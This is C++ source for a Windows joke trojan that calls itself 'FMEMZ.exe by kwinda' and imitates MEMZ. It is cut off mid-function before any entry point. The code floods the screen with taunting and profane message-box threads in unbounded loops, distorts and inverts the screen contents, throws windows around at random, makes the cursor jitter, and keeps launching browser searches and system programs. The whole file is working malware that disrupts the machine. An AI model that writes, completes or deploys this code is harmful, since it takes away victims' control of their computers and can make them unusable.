#include <windows.h>
#define M_PI   3.14159265358979323846264338327950288
#include <tchar.h>
#include <ctime>
#include <iostream>
#include <windowsx.h>
#include <stdio.h>
#include <string.h>
#include <winternl.h>
#include <tlhelp32.h>
#include <fstream>
#include <psapi.h>
#pragma comment(lib, "psapi.lib")
#pragma comment(lib, "winmm.lib")
#pragma comment(lib,"Msimg32.lib")
#include <math.h>
COLORREF TripleRGB() {
	int clr = rand() % 4;
	if (clr == 0) return RGB(110, 0, 0); if (clr == 1) return RGB(0, 110, 0); if (clr == 2) return RGB(20, 10, 255); if (clr == 3) return RGB(1, 20, 30); if (clr == 4) return RGB(255, 255, 0);
}
LPCWSTR  generateRandomUnicodeString(int len)
{
	wchar_t* ustr = new wchar_t[len + 1];

	for (int i = 0; i < len; i++) {
		ustr[i] = (rand() % 256) + 1024;
	}
	ustr[len] = L'\0';
	return ustr;
}
HHOOK hHook = NULL;
int randomX = 0;
int randomY = 0;

LRESULT CALLBACK CBTProc(int nCode, WPARAM wParam, LPARAM lParam) {
	if (nCode == HCBT_CREATEWND) {
		HWND hwnd = (HWND)wParam;

		wchar_t className[256];
		GetClassName(hwnd, className, 256);
		if (wcscmp(className, L"#32770") == 0) {
			SetWindowPos(hwnd, NULL, randomX, randomY, 0, 0, SWP_NOSIZE | SWP_NOZORDER);

			UnhookWindowsHookEx(hHook);
		}
	}
	return CallNextHookEx(hHook, nCode, wParam, lParam);
}

DWORD WINAPI M(LPVOID lpParam) {
	int screenWidth = GetSystemMetrics(SM_CXSCREEN);
	int screenHeight = GetSystemMetrics(SM_CYSCREEN);

	srand(GetTickCount());

	while (1) {
		randomX = rand() % (screenWidth - 300);
		randomY = rand() % (screenHeight - 200);

		hHook = SetWindowsHookEx(WH_CBT, CBTProc, NULL, GetCurrentThreadId());

		MessageBox(NULL, NULL, L"FMEMZ.EXE", MB_ICONERROR);
	}
	return 0;
}
DWORD WINAPI M1(LPVOID lpParam) {
	int screenWidth = GetSystemMetrics(SM_CXSCREEN);
	int screenHeight = GetSystemMetrics(SM_CYSCREEN);

	srand(GetTickCount());

	while (1) {
		randomX = rand() % (screenWidth - 300);
		randomY = rand() % (screenHeight - 200);

		hHook = SetWindowsHookEx(WH_CBT, CBTProc, NULL, GetCurrentThreadId());
		MessageBox(NULL, L"you are idiot :) :) :)", L"FMEMZ.EXE", MB_ICONERROR);
	}
	return 0;
}
DWORD WINAPI lastmsg1(LPVOID lpParam) {
	int screenWidth = GetSystemMetrics(SM_CXSCREEN);
	int screenHeight = GetSystemMetrics(SM_CYSCREEN);

	srand(GetTickCount());

	while (1) {
		randomX = rand() % (screenWidth - 300);
		randomY = rand() % (screenHeight - 200);

		hHook = SetWindowsHookEx(WH_CBT, CBTProc, NULL, GetCurrentThreadId());
		MessageBox(NULL, L"Nyan Cat! nyanyanya", L"FMEMZ.EXE", MB_ICONERROR);
	}
	return 0;
}
DWORD WINAPI lastmsg2(LPVOID lpParam) {
	int screenWidth = GetSystemMetrics(SM_CXSCREEN);
	int screenHeight = GetSystemMetrics(SM_CYSCREEN);

	srand(GetTickCount());

	while (1) {
		randomX = rand() % (screenWidth - 300);
		randomY = rand() % (screenHeight - 200);

		hHook = SetWindowsHookEx(WH_CBT, CBTProc, NULL, GetCurrentThreadId());
		MessageBox(NULL, L"sin()", L"cos()", MB_ICONERROR);
	}
	return 0;
}
DWORD WINAPI lastmsg3(LPVOID lpParam) {
	int screenWidth = GetSystemMetrics(SM_CXSCREEN);
	int screenHeight = GetSystemMetrics(SM_CYSCREEN);

	srand(GetTickCount());

	while (1) {
		randomX = rand() % (screenWidth - 300);
		randomY = rand() % (screenHeight - 200);

		hHook = SetWindowsHookEx(WH_CBT, CBTProc, NULL, GetCurrentThreadId());
		MessageBox(NULL, L"cos", L"sin()", MB_ICONERROR);
	}
	return 0;
}
DWORD WINAPI lastmsg4(LPVOID lpParam) {
	int screenWidth = GetSystemMetrics(SM_CXSCREEN);
	int screenHeight = GetSystemMetrics(SM_CYSCREEN);

	srand(GetTickCount());

	while (1) {
		randomX = rand() % (screenWidth - 300);
		randomY = rand() % (screenHeight - 200);

		hHook = SetWindowsHookEx(WH_CBT, CBTProc, NULL, GetCurrentThreadId());
		MessageBox(NULL, L"fuck you pc, AHHHHHHHHH", L"I'm gonna drop 250k tons of TNT on you!", MB_ICONERROR);
	}
	return 0;
}
DWORD WINAPI blurshuffle(LPVOID lpParam) {
	HDC desk = GetDC(0);
	int sw = GetSystemMetrics(0);
	int sh = GetSystemMetrics(1);

	HDC hdcMem = CreateCompatibleDC(desk);
	HBITMAP screenshot = CreateCompatibleBitmap(desk, sw, sh);
	HGDIOBJ oldBmp = SelectObject(hdcMem, screenshot);

	HFONT hFont = CreateFont(54, 0, 0, 0, FW_EXTRABOLD, FALSE, FALSE, FALSE,
		ANSI_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS,
		DEFAULT_QUALITY, DEFAULT_PITCH | FF_DONTCARE, L"Arial");
	HGDIOBJ oldFont = SelectObject(hdcMem, hFont);

	SetBkMode(hdcMem, TRANSPARENT);

	HDC hdcColor = CreateCompatibleDC(desk);
	HBITMAP colorBmp = CreateCompatibleBitmap(desk, sw, sh);
	HGDIOBJ oldColorBmp = SelectObject(hdcColor, colorBmp);

	int colorCycle = 0;

	while (1) {
		ReleaseDC(0, desk);
		desk = GetDC(0);

		BitBlt(hdcMem, 0, 0, sw, sh, desk, 0, 0, SRCCOPY);

		StretchBlt(hdcMem, 1, 1, sw - 1, sh - 1, hdcMem, 0, 0, sw, sh, SRCCOPY);

		colorCycle += 2;

		int r = (int)(abs(sin(colorCycle * 0.03)) * 25) + 5;
		int g = (int)(abs(cos(colorCycle * 0.02)) * 15) + 5;
		int b_color = (int)(abs(sin(colorCycle * 0.01)) * 35) + 5;

		HBRUSH hBrush = CreateSolidBrush(RGB(r, g, b_color));
		RECT rect = { 0, 0, sw, sh };
		FillRect(hdcColor, &rect, hBrush);
		DeleteObject(hBrush);

		BLENDFUNCTION blend = { AC_SRC_OVER, 0, 12, 0 };
		AlphaBlend(hdcMem, 0, 0, sw, sh, hdcColor, 0, 0, sw, sh, blend);

		SetTextColor(hdcMem, RGB(rand() % 100 + 155, rand() % 100 + 155, rand() % 100 + 155));

		if (rand() % 15 == 0) {
			const wchar_t* txt = L"FMEMZ.exe by kwinda";
			TextOut(hdcMem, rand() % (sw - 400), rand() % (sh - 60), txt, wcslen(txt));
		}
		if (rand() % 15 == 0) {
			const wchar_t* txt = L"Still using this computer?";
			TextOut(hdcMem, rand() % (sw - 500), rand() % (sh - 60), txt, wcslen(txt));
		}
		if (rand() % 15 == 0) {
			const wchar_t* txt = L"FMEMZ.exe";
			TextOut(hdcMem, rand() % (sw - 200), rand() % (sh - 60), txt, wcslen(txt));
		}
		if (rand() % 15 == 0) {
			const wchar_t* txt = L"kwinda";
			TextOut(hdcMem, rand() % (sw - 150), rand() % (sh - 60), txt, wcslen(txt));
		}
		if (rand() % 15 == 0) {
			const wchar_t* txt = L"nya nya mbr";
			TextOut(hdcMem, rand() % (sw - 250), rand() % (sh - 60), txt, wcslen(txt));
		}
		int a = rand() % (sw - 200);
		int b = rand() % (sh - 200);
		BitBlt(hdcMem, a, b, 200, 200, hdcMem, a + rand() % 11 - 5, b + rand() % 11 - 5, SRCCOPY);

		BitBlt(desk, 0, 0, sw, sh, hdcMem, 0, 0, SRCCOPY);

		Sleep(20);
	}

	SelectObject(hdcColor, oldColorBmp);
	DeleteObject(colorBmp);
	DeleteDC(hdcColor);

	SelectObject(hdcMem, oldFont);
	DeleteObject(hFont);
	SelectObject(hdcMem, oldBmp);
	DeleteObject(screenshot);
	DeleteDC(hdcMem);
	ReleaseDC(0, desk);

	return 0;
}
DWORD WINAPI M2(LPVOID lpParam) {
	int screenWidth = GetSystemMetrics(SM_CXSCREEN);
	int screenHeight = GetSystemMetrics(SM_CYSCREEN);

	srand(GetTickCount());

	while (1) {
		randomX = rand() % (screenWidth - 300);
		randomY = rand() % (screenHeight - 200);

		hHook = SetWindowsHookEx(WH_CBT, CBTProc, NULL, GetCurrentThreadId());
		MessageBox(NULL, L"Still using this computer?", L"FMEMZ.exe", MB_ICONWARNING);
	}
	return 0;
}
DWORD WINAPI nulll(LPVOID lpParam) {
	int screenWidth = GetSystemMetrics(SM_CXSCREEN);
	int screenHeight = GetSystemMetrics(SM_CYSCREEN);

	srand(GetTickCount());

	while (1) {
		randomX = rand() % (screenWidth - 300);
		randomY = rand() % (screenHeight - 200);

		hHook = SetWindowsHookEx(WH_CBT, CBTProc, NULL, GetCurrentThreadId());
		MessageBox(NULL, NULL, NULL, NULL);
		MessageBox(NULL, NULL, NULL, NULL);
		MessageBox(NULL, NULL, NULL, NULL);
		MessageBox(NULL, NULL, NULL, NULL);
		MessageBox(NULL, NULL, NULL, NULL);
	}
	return 0;
}
BOOL CALLBACK MoveWindowCallback(HWND hwnd, LPARAM lParam) {
	int screenWidth = GetSystemMetrics(SM_CXSCREEN);
	int screenHeight = GetSystemMetrics(SM_CYSCREEN);

	if (!IsWindowVisible(hwnd) || IsIconic(hwnd)) {
		return TRUE;
	}

	int newX = rand() % screenWidth;
	int newY = rand() % screenHeight;

	int newWidth = (rand() % (screenWidth / 2)) + 100;
	int newHeight = (rand() % (screenHeight / 2)) + 100;


	SetWindowPos(hwnd, HWND_TOP, newX, newY, newWidth, newHeight, SWP_NOACTIVATE | SWP_NOREDRAW);

	return TRUE;
}
DWORD WINAPI window(LPVOID lpParam) {
	srand((unsigned)time(NULL));

	while (true) {
		EnumWindows(MoveWindowCallback, 0);
		Sleep(0);
	}

	return 0;
}
DWORD WINAPI window1(LPVOID lpParam) {
	srand((unsigned)time(NULL));

	while (true) {
		EnumWindows(MoveWindowCallback, 0);
		Sleep(1000);
	}

	return 0;
}
using namespace std;
DWORD WINAPI url1(LPVOID lpParam) {
system("start https://github.com/kwindaaXD1");
return 0;
}
DWORD WINAPI url2(LPVOID lpParam) {
	system("start https://www.google.com/search?q=how+to+remove+memz+trojan%3F&biw=1912&bih=914&sca_esv=29cd9412ce350a53&sxsrf=APpeQnv-iPK5jEczbuHzKMim3kw7g2I1jw%3A1785696383383&ei=f5BvaouDF76PwPAPmNvg4AI&ved=0ahUKEwjLvu60zYKWAxW-BxAIHZgtGCwQ4dUDCBA&uact=5&oq=how+to+remove+memz+trojan%3F&gs_lp=Egxnd3Mtd2l6LXNlcnAiGmhvdyB0byByZW1vdmUgbWVteiB0cm9qYW4_SNQ6UO0KWLY3cAN4AJABAJgBcaABwAaqAQM5LjG4AQPIAQD4AQGYAgGgAgLCAgsQABiABBjLARiwA8ICCRAAGB4YsAMYCsICCBAAGO8FGLADmAMAiAYBkAYDkgcBMaAH4QSyBwC4BwDCBwMwLjHIBwGACAE&sclient=gws-wiz-serp");
	return 0;
}
DWORD WINAPI url3(LPVOID lpParam) {
	system("start https://www.google.com/search?q=memz.exe+download+free+no+virus+&biw=1912&bih=914&sca_esv=29cd9412ce350a53&sxsrf=APpeQnvz91AkrbyTsixe8j6VbLFdgrwy1g%3A1785696391889&ei=h5Bvav7hNbzAwPAP38HskAc&ved=0ahUKEwi-wfW4zYKWAxU8IBAIHd8gG3IQ4dUDCBA&uact=5&oq=memz.exe+download+free+no+virus+&gs_lp=Egxnd3Mtd2l6LXNlcnAiIG1lbXouZXhlIGRvd25sb2FkIGZyZWUgbm8gdmlydXMgMgUQIRigATIFECEYoAEyBRAhGKABMgUQIRigAUi4mwFQ3QhYspIBcAh4AJABAJgBdKABuxeqAQQzNi4zuAEDyAEA-AEBmAIgoAKhD6gCFMICBxAjGOoCGCfCAhAQIxjwBRieBhiiBxjqAhgnwgIQEAAYAxiPARjqAhi0AtgBAcICEBAuGAMYjwEY6gIYtALYAQHCAgQQIxgnwgIKEAAYgAQYigUYQ8ICCBAAGIAEGLEDwgIIEC4YgAQYsQPCAgsQABiABBixAxiDAcICDhAuGIAEGLEDGMcBGNEDwgIFEAAYgATCAgoQABiABBgUGIcCwgINEC4YgAQYxwEY0QMYCsICCBAAGIAEGMcDwgIGEAAYFhgewgIJEAAYFhgeGMcDwgIKEAAYgAQYDRjHA8ICCBAAGAUYHhgNwgIIEAAYgAQYogTCAgQQABgewgIHEAAYHhjHA8ICBhAAGB4YCsICCRAAGAgYHhjHA8ICBxAhGAoYoAHCAgUQIRifBZgDBvEFa1ope-gfnB-6BgYIARABGAqSBwQyOS4zoAfzcLIHBDIxLjO4B4wPwgcGMi4yOC4yyAc4gAgB&sclient=gws-wiz-serp");
	return 0;
}
DWORD WINAPI url4(LPVOID lpParam) {
	system("start https://www.google.com/search?q=jokes+for+friends+Funny+%F0%9F%98%82%F0%9F%98%82%F0%9F%98%82%F0%9F%98%82%F0%9F%98%82%F0%9F%98%82%F0%9F%98%82%F0%9F%98%82%F0%9F%98%82%F0%9F%98%82&biw=1912&bih=914&sca_esv=29cd9412ce350a53&sxsrf=APpeQnthMPYKOo63Zb3blBGwKYTk-X5WNg%3A1785696553498&ei=KZFvapz6Hd3vwPAPiYmbyQ8&ved=0ahUKEwjcsv2FzoKWAxXdNxAIHYnEJvkQ4dUDCBA&uact=5&oq=jokes+for+friends+Funny+%F0%9F%98%82%F0%9F%98%82%F0%9F%98%82%F0%9F%98%82%F0%9F%98%82%F0%9F%98%82%F0%9F%98%82%F0%9F%98%82%F0%9F%98%82%F0%9F%98%82&gs_lp=Egxnd3Mtd2l6LXNlcnAiQGpva2VzIGZvciBmcmllbmRzIEZ1bm55IPCfmILwn5iC8J-YgvCfmILwn5iC8J-YgvCfmILwn5iC8J-YgvCfmIIyBhAAGBYYHjIGEAAYFhgeMgYQABgWGB4yBhAAGBYYHjIGEAAYFhgeMgYQABgWGB4yBhAAGBYYHjIGEAAYFhgeMgYQABgWGB4yBhAAGBYYHkixiAFQwQlYx31wBHgBkAEAmAGKAaAB2AuqAQQxOC4xuAEDyAEA-AEBmAIXoAKaDMICChAAGEcY1gQYsAPCAg0QABiABBiKBRhDGLADwgIIEAAYgAQYywHCAggQABgWGB4YCsICBRAhGKABmAMAiAYBkAYKkgcEMjIuMaAH9HeyBwQxOC4xuAeMDMIHBjAuMjIuMcgHKoAIAQ&sclient=gws-wiz-serp");
	return 0;
}
DWORD WINAPI url5(LPVOID lpParam) {
system("start https://www.google.com/search?q=Windows+aero+download+free+super+its+cool+i+am+not+a+gey+i+am+joke+i%27m+IDIOT%21&biw=1912&bih=914&sca_esv=29cd9412ce350a53&sxsrf=APpeQnt9A3KYP4A-4XhmVAdPbYsBPFuUqw%3A1785696686196&ei=rpFvaqzLC4yC1fIPwY-BuA8&ved=0ahUKEwis2qDFzoKWAxUMQVUIHcFHAPcQ4dUDCBA&uact=5&oq=Windows+aero+download+free+super+its+cool+i+am+not+a+gey+i+am+joke+i%27m+IDIOT%21&gs_lp=Egxnd3Mtd2l6LXNlcnAiTVdpbmRvd3MgYWVybyBkb3dubG9hZCBmcmVlIHN1cGVyIGl0cyBjb29sIGkgYW0gbm90IGEgZ2V5IGkgYW0gam9rZSBpJ20gSURJT1QhSLr4AlCCFVjy9AJwDngBkAEAmAGSAaAB7jmqAQU3My4xNbgBA8gBAPgBAZgCRaAClyuoAhPCAgcQIxjqAhgnwgIQECMY8AUYngYYogcY6gIYJ8ICFhAAGIAEGIoFGEMY5wYY6gIYtALYAQHCAhYQLhiABBiKBRhDGOcGGOoCGLQC2AEBwgIEECMYJ8ICChAjGMkCGPAFGCfCAggQABiABBixA8ICExAuGIAEGIoFGEMYsQMYxwEY0QPCAgsQABiABBixAxiDAcICChAAGIAEGIoFGEPCAgUQABiABMICCxAuGIAEGMcBGNEDwgIREC4YgwEYxwEYsQMY0QMYgATCAhAQLhiABBiKBRhDGMcBGNEDwgIOEC4YgAQYigUYsQMYgwHCAg4QLhiABBixAxjHARjRA8ICERAuGIAEGLEDGIMBGMcBGNEDwgIKEC4YgAQYigUYQ8ICDRAAGIAEGBQYhwIYsQPCAggQLhiABBixA8ICChAAGIAEGBQYhwLCAggQABiABBjLAcICBhAAGBYYHsICCBAAGBYYHhgKwgIIEAAYgAQYogTCAgUQABjvBcICBRAhGKABwgIEECEYFcICBxAhGAoYoAHCAgUQIRifBZgDBfEFw-seXqfxmH-6BgYIARABGAGSBwU1MC4xOaAHvJkDsgcFNDMuMTm4B4IrwgcHMTUuNTIuMsgHbYAIAQ&sclient=gws-wiz-serp");
	return 0;
}
DWORD WINAPI url6(LPVOID lpParam) {
 system("start https://octocat.github.io/");
	return 0;
}
DWORD WINAPI url7(LPVOID lpParam) {
	system("start https://www.google.com/search?q=MEMZ.exe+source&sca_esv=b0c671fd83345bc7&sxsrf=APpeQnvD5pInbVcNJsZ_Ga9USlSJuomd7g%3A1787217910783&ei=9seGapKwL_rMwPAPht-m2A0&biw=952&bih=630&ved=0ahUKEwiSg9XF8a6WAxV6JhAIHYavCdsQ4dUDCBA&uact=5&oq=MEMZ.exe+source&gs_lp=Egxnd3Mtd2l6LXNlcnAiD01FTVouZXhlIHNvdXJjZUiYeFChD1jSdXAEeAGQAQCYAVGgAYoJqgECMTi4AQPIAQD4AQGYAhGgAtwGqAIKwgIHECMY6gIYJ8ICEBAjGKIHGJ4GGPAFGOoCGCfCAhAQIxjwBRieBhiiBxjqAhgnwgILEAAYgAQYsQMYgwHCAggQABiABBixA8ICCBAuGIAEGLEDwgISEAAYARiABBiKBRixAxiDARgKwgIKEAAYARiABBixA8ICDRAjGKIHGJ4GGPAFGCfCAgQQIxgnwgIREC4YgAQYsQMYgwEYxwEY0QPCAg4QLhiABBiKBRixAxiDAcICBRAAGIAEwgIKEAAYgAQYigUYQ8ICChAuGIAEGIoFGEPCAhMQLhiABBiKBRhDGLEDGMcBGNEDwgIOEC4YgAQYsQMYxwEY0QPCAhAQLhiABBiKBRhDGMcBGNEDwgIWEC4YgAQYigUYQxixAxiDARjHARjRA8ICEBAAGIAEGIoFGEMYsQMYgwHCAg0QABiABBiKBRhDGLEDwgIQEC4YgAQYigUYQxixAxiDAcICCBAAGIAEGMsBwgIEEAAYHsICBhAAGB4YCsICBxAAGB4YxwPCAgYQABgWGB7CAggQABiABBiiBMICBRAAGO8FmAMF8QVEdO_kV8xZOJIHAjE3oAeXbrIHAjEzuAfGBsIHBTAuOS44yAc1gAgB&sclient=gws-wiz-serp");
	return 0;
}
DWORD WINAPI url8(LPVOID lpParam) {
	system("start https://www.google.com/search?q=Leurak&oq=Leurak&gs_lcrp=EgZjaHJvbWUyBggAEEUYOTIJCAEQABgeGMcDMgkIAhAAGB4YxwMyCwgDEAAYChgeGMcD0gEJODM1MjJqMGo3qAIAsAIA&sourceid=chrome&source=chrome.ob&ie=UTF-8");
	return 0;
}
DWORD WINAPI url9(LPVOID lpParam) {
	system("start https://www.google.com/search?q=pc+optimizer+pro&sca_esv=b0c671fd83345bc7&sxsrf=APpeQnuw9JEp1JsGg9R29Wghpu_RUHquJw%3A1787219417177&ei=2c2GarGxCrib1fIPjLK7gAw&biw=1920&bih=992&oq=PC+optimize&gs_lp=Egxnd3Mtd2l6LXNlcnAiC1BDIG9wdGltaXplKgIIATIFEAAYgAQyBRAAGIAEMggQABiABBjLATIIEAAYgAQYywEyCBAAGIAEGMsBMggQABiABBjLATIIEAAYgAQYywEyCBAAGIAEGMsBMggQABiABBjLATIIEAAYgAQYywFI2_4CULcaWKvoAnAmeACQAQCYAaECoAHdHKoBBjQ1LjIuMbgBAcgBAPgBAZgCVqACmx-oAhTCAgcQIxjqAhgnwgIQECMY8AUYngYYogcY6gIYJ8ICEBAjGKIHGJ4GGPAFGOoCGCfCAhAQABgDGI8BGOoCGLQC2AEBwgIQEC4YAxiPARjqAhi0AtgBAcICBBAjGCfCAg0QIxiiBxieBhjwBRgnwgIOEAAYgAQYigUYsQMYgwHCAhQQLhiABBiKBRixAxiDARjHARjRA8ICCxAAGIAEGLEDGIMBwgIREC4YgAQYsQMYgwEYxwEY0QPCAgUQLhiABMICCxAuGIAEGMcBGNEDwgIIEAAYgAQYsQPCAg4QLhiABBixAxjHARjRA8ICCBAuGLEDGIAEwgIKEAAYgAQYigUYQ8ICDRAjGPAFGJ4GGKIHGCfCAggQLhiABBixA8ICChAuGIAEGIoFGEPCAhAQABiABBiKBRhDGLEDGIMBwgIJEAAYgAQYChgLwgIJEC4YgAQYChgLwgIKEC4YgAQYDRixA8ICBxAAGIAEGA3CAhkQLhiABBgNGLEDGJcFGNwEGN4EGN8E2AEBwgIHEAAYgAQYCsICDBAuGIAEGAoYCxixA8ICDxAAGIAEGAoYCxixAxiDAcICChAAGIAEGMsBGArCAgQQABgewgIOEC4YgAQYigUYsQMYgwHCAgsQABiABBiKBRixA8ICFBAuGIAEGJcFGNwEGN4EGOAE2AEBwgIEEAAYA8ICFhAuGIAEGIoFGEMYsQMYgwEYxwEY0QPCAhMQLhiABBiKBRhDGLEDGMcBGNEDwgINEAAYgAQYigUYQxixA5gDB_EFrt2qVtR9JxW6BgYIARABGAqSBwY4My4yLjGgB9niArIHBjQ1LjIuMbgHnR7CBwcwLjUwLjM2yAf0AYAIAQ&sclient=gws-wiz-serp");
	return 0;
}
DWORD WINAPI thing6(LPVOID lpParam) {
	while (1) {
		CreateThread(0, 0, M, 0, 0, 0);
		Sleep(2000);
		CreateThread(0, 0, M1, 0, 0, 0);
		Sleep(2000);
		CreateThread(0, 0, M2, 0, 0, 0);
		Sleep(2000);
		CreateThread(0, 0, nulll, 0, 0, 0);
		Sleep(2000);
	}
	return 0;
}
DWORD WINAPI thing7(LPVOID lpParam) {
	while (1) {
		CreateThread(0, 0, M, 0, 0, 0);
		Sleep(1000);
		CreateThread(0, 0, M1, 0, 0, 0);
		Sleep(1000);
		CreateThread(0, 0, M2, 0, 0, 0);
		Sleep(1000);
		CreateThread(0, 0, nulll, 0, 0, 0);
		Sleep(1000);
	}
	return 0;
}
DWORD WINAPI thing8(LPVOID lpParam) {
	while (1) {
		CreateThread(0, 0, M, 0, 0, 0);
		Sleep(5);
		CreateThread(0, 0, M1, 0, 0, 0);
		Sleep(5);
		CreateThread(0, 0, M2, 0, 0, 0);
		Sleep(5);
		CreateThread(0, 0, nulll, 0, 0, 0);
		Sleep(5);
		CreateThread(0, 0, lastmsg1, 0, 0, 0);
		Sleep(5);
		CreateThread(0, 0, lastmsg2, 0, 0, 0);
		Sleep(5);
		CreateThread(0, 0, lastmsg3, 0, 0, 0);
		Sleep(5);
		CreateThread(0, 0, lastmsg4, 0, 0, 0);
		Sleep(5);
	}
	return 0;
}
DWORD WINAPI tunnel(LPVOID lpParam) {
	int sw, sh;

	while (1) {
		HDC hdc = GetDC(0);
		sw = GetSystemMetrics(SM_CXSCREEN);
		sh = GetSystemMetrics(SM_CYSCREEN);

		// For zooming out, the source area should be larger than the destination area.
		// We shrink the destination area by 40 pixels, so the source area should be larger by the same amount.
		StretchBlt(hdc, 20, 20, sw - 40, sh - 40, hdc, 0, 0, sw, sh, SRCCOPY);

		ReleaseDC(0, hdc);
		Sleep(300);
	}
}
DWORD WINAPI tunnel1(LPVOID lpParam) {
	int sw, sh;

	while (1) {
		HDC hdc = GetDC(0);
		sw = GetSystemMetrics(SM_CXSCREEN);
		sh = GetSystemMetrics(SM_CYSCREEN);

		// For zooming out, the source area should be larger than the destination area.
		// We shrink the destination area by 40 pixels, so the source area should be larger by the same amount.
		StretchBlt(hdc, 20, 20, sw - 40, sh - 40, hdc, 0, 0, sw, sh, SRCCOPY);

		ReleaseDC(0, hdc);
		Sleep(100);
	}
}
DWORD WINAPI tunnel2(LPVOID lpParam) {
	int sw, sh;

	while (1) {
		HDC hdc = GetDC(0);
		sw = GetSystemMetrics(SM_CXSCREEN);
		sh = GetSystemMetrics(SM_CYSCREEN);

		// For zooming out, the source area should be larger than the destination area.
		// We shrink the destination area by 40 pixels, so the source area should be larger by the same amount.
		StretchBlt(hdc, 20, 20, sw - 40, sh - 40, hdc, 0, 0, sw, sh, SRCCOPY);

		ReleaseDC(0, hdc);
		Sleep(85);
	}
}
DWORD WINAPI winshake(LPVOID lpParam)
{
	int x = GetSystemMetrics(SM_CXSCREEN);
	int y = GetSystemMetrics(SM_CYSCREEN);

	RECT rekt;

	while (true) {
		HWND hwnd = GetForegroundWindow();
		GetWindowRect(hwnd, &rekt);

		int sel = rand() % 4 + 1;

		if (rekt.left >= x) {
			rekt.left = 0;
		}
		else if (rekt.top >= y) {
			rekt.top = 0;
		}
		else if (rekt.left <= 0) {
			rekt.left = 0;
		}
		else if (rekt.top <= 0) {
			rekt.top = 0;
		}

		int xs = rekt.left;
		int ys = rekt.top;
		int rnd = rand() % 100 + 60;

		for (int i = 0; i < rnd; i += 20) {
			if (sel == 1) {
				SetWindowPos(hwnd, 0, xs + i, ys + i, xs, ys, 0);
				Sleep(10);
			}
			else if (sel == 2) {
				SetWindowPos(hwnd, 0, xs - i, ys + i, xs, ys, 0);
				Sleep(10);
			}
			else if (sel == 3) {
				SetWindowPos(hwnd, 0, xs + i, ys - i, xs, ys, 0);
				Sleep(10);
			}
			else if (sel == 4) {
				SetWindowPos(hwnd, 0, xs - i, ys - i, xs, ys, 0);
				Sleep(10);
			}
		}
	}
}
DWORD WINAPI tunnel3(LPVOID lpParam) {
	int sw, sh;

	while (1) {
		HDC hdc = GetDC(0);
		sw = GetSystemMetrics(SM_CXSCREEN);
		sh = GetSystemMetrics(SM_CYSCREEN);

		// For zooming out, the source area should be larger than the destination area.
		// We shrink the destination area by 40 pixels, so the source area should be larger by the same amount.
		StretchBlt(hdc, 20, 20, sw - 40, sh - 40, hdc, 0, 0, sw, sh, SRCCOPY);

		ReleaseDC(0, hdc);
		Sleep(20);
	}
}
HANDLE blsh = NULL;
DWORD WINAPI thingеtunnel(LPVOID lpParam) {
	LPTHREAD_START_ROUTINE tunnel_functions[] = { tunnel, tunnel1, tunnel2, tunnel3 };

	while (1) {
		for (int i = 0; i < 4; i++) {
			if (blsh != NULL) {
				return 0;
			}

			HANDLE current_tunnel = CreateThread(0, 0, tunnel_functions[i], 0, 0, 0);

			for (int delay = 0; delay < 100; delay++) {
				Sleep(100);

				if (blsh != NULL) {
					if (current_tunnel != NULL) {
						TerminateThread(current_tunnel, 0);
						CloseHandle(current_tunnel);
					}
					return 0;
				}
			}

			if (current_tunnel != NULL) {
				TerminateThread(current_tunnel, 0);
				CloseHandle(current_tunnel);
			}
		}
	}
	return 0;
}

DWORD WINAPI inv(LPVOID lpParam) {
	HDC hdc = GetDC(0);
	int x = GetSystemMetrics(0);
	int y = GetSystemMetrics(1);

	while (1)
	{
		hdc = GetDC(0);
		PatBlt(hdc, 0, 0, x, y, PATINVERT);
		Sleep(400);
		ReleaseDC(0, hdc);
	}
}
DWORD WINAPI errcur(LPVOID lpParam) {
		POINT cursor;
		while (1) {
			HDC hdc = GetDC(HWND_DESKTOP);
			int icon_x = GetSystemMetrics(SM_CXICON);
			int icon_y = GetSystemMetrics(SM_CYICON);
			GetCursorPos(&cursor);
			int X = cursor.x + rand() % 3 - 1;
			int Y = cursor.y + rand() % 3 - 1;
			//SetCursorPos(X, Y);
			DrawIcon(hdc, cursor.x - icon_x, cursor.y - icon_y, LoadIcon(NULL, IDI_ERROR));
			ReleaseDC(0, hdc);
			//Sleep(10);
		}
		return(1);
}
DWORD WINAPI opens(LPVOID lpParam) {
	{
		while (1);
		system("start regedit.exe");
		Sleep(2000);
		system("start explorer.exe");
		Sleep(2000);
		system("start notepad.exe");
		Sleep(2000);
		system("start regedit.exe /hmdmdmdmdmdmdmddmmdd");
		Sleep(2000);
		system("start https://google.com");
		Sleep(2000);
		return(1);
	}
}
DWORD WINAPI moos(LPVOID lpParam) {
	while (1) {
		CreateThread(0, 0, url1, 0, 0, 0);
		Sleep(3000);

		CreateThread(0, 0, url2, 0, 0, 0);
		Sleep(3000);

		CreateThread(0, 0, url3, 0, 0, 0);
		Sleep(3000);

		CreateThread(0, 0, url4, 0, 0, 0);
		Sleep(3000);

		CreateThread(0, 0, url5, 0, 0, 0);
		Sleep(3000);
		CreateThread(0, 0, url6, 0, 0, 0);
		Sleep(3000);
		CreateThread(0, 0, url7, 0, 0, 0);
		Sleep(3000);
		CreateThread(0, 0, url8, 0, 0, 0);
		Sleep(3000);
		CreateThread(0, 0, url9, 0, 0, 0);
		Sleep(3000);
		CreateThread(0, 0, url8, 0, 0, 0);
		Sleep(3000);
		CreateThread(0, 0, url4, 0, 0, 0);
		Sleep(3000);
		CreateThread(0, 0, url9, 0, 0, 0);
		Sleep(3000);
		CreateThread(0, 0, url2, 0, 0, 0);
		Sleep(3000);
		CreateThread(0, 0, url4, 0, 0, 0);
		Sleep(3000);
		CreateThread(0, 0, url1, 0, 0, 0);
		Sleep(3000);

	}
	return 1;
}
DWORD WINAPI craz1(LPVOID lpParam) {
	POINT cursor;
	while (1) {
		GetCursorPos(&cursor);
		int X = cursor.x + rand() % 3 - 1;
		int Y = cursor.y + rand() % 3 - 1;
		SetCursorPos(X, Y);
		//BlockInput(true);
		Sleep(30);
	}
	return(1);
}
DWORD WINAPI craz2(LPVOID lpParam) {
	POINT cursor;
	while (1) {
		GetCursorPos(&cursor);
		int X = cursor.x + rand() % 3 - 1;
		int Y = cursor.y + rand() % 3 - 1;
		SetCursorPos(X, Y);
		//BlockInput(true);
		Sleep(20);
	}
	return(1);
}
DWORD WINAPI craz3(LPVOID lpParam) {
	POINT cursor;
	while (1) {
		GetCursorPos(&cursor);
		int X = cursor.x + rand() % 3 - 1;
		int Y = cursor.y + rand() % 3 - 1;
		SetCursorPos(X, Y);
		//BlockInput(true);
		Sleep(14);
	}
	return(1);
}
DWORD WINAPI craz4(LPVOID lpParam) {
	POINT cursor;
	while (1) {
